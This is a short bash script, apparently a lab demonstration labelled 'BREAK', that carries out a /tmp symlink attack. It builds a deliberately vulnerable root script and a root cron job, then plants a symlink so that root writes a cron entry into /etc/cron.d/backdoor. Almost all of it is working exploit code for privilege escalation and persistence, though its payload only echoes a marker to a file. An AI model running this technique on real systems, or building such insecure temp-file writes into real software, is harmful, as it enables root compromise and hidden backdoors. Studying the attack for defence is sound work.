#!/bin/bash
# BREAK: Symlink attack via /tmp redirecting root writes to /etc/cron.d
# A root script writes to /tmp/report.txt every minute.
# Attacker creates a symlink there before the script runs.
# Root unknowingly writes a cron job into /etc/cron.d/backdoor.

# Step 1 — create the vulnerable root script
cat > /usr/local/bin/report.sh << 'EOF'
#!/bin/bash
echo "* * * * * root echo [PWNED] >> /tmp/pwned.txt" > /tmp/report.txt
EOF
chmod +x /usr/local/bin/report.sh

# Step 2 — set root cron job
crontab - << 'EOF'
* * * * * /usr/local/bin/report.sh
EOF

# Step 3 — start cron
service cron start

# Step 4 — plant the symlink before root script fires
ln -sf /etc/cron.d/backdoor /tmp/report.txt

echo "[BREAK] symlink planted. wait 90 seconds then check:"
echo "  cat /etc/cron.d/backdoor"
echo "  sleep 65 && cat /tmp/pwned.txt"
